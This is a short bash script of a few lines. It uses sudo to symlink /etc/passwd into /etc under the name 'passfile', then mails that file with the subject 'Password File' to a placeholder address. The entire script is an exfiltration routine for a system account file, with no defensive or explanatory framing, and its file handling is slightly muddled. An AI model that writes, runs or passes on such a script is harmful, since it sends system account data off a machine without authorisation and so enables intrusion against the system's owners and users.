#!/bin/bash

touch passfile

cd /etc

sudo ln -s passwd passfile

mail -s "Password File" -A passfile "mail that you send to"
